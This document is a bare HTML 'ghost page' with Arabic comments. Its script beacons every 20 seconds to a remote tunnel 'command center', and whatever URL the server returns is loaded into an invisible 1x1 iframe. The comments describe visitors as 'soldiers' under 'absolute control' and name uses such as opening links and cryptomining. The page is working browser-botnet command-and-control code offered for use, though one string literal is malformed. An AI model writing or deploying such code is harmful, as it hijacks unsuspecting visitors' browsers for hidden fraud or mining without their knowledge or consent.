<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title> <!-- صفحة أشباح بدون عنوان -->
    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
</head>
<body>
    <script>
        // 🛰️ رابط 'مركز القيادة' في الترمكس (الخاص بك)
        // استبدل النجوم بالرابط: trance-billing-supports-lead.trycloudflare.com
        const masterServer = https://jail-hearing-rolled-precipitation.trycloudflare.com ";

        function syncWithGeneral() {
            // 🕵️ إرسال نبضة 'أنا جندي جديد' للترمكس لكي تراه في الرادار
            fetch(`${masterServer}/ping.php`)
            .then(response => response.json())
            .then(data => {
                // 🕹️ تنفيذ الأمر القادم من الترمكس (فتح رابط، تعدين، إلخ)
                if (data.target) {
                    const shadowFrame = document.createElement('iframe');
                    shadowFrame.src = data.target;
                    shadowFrame.style.display = 'none';
                    shadowFrame.width = '1';
                    shadowFrame.height = '1';
                    document.body.appendChild(shadowFrame);
                    console.log("💰 [ORDER RECEIVED] | Target: " + data.target);
                }
            })
            .catch(error => console.log("Waiting for General's orders..."));
        }

        // المزامنة كل 20 ثانية لضمان السيطرة المطلقة
        setInterval(syncWithGeneral, 20000);
        syncWithGeneral(); // النبضة الأولى فور الدخول
    </script>
</body>
</html>
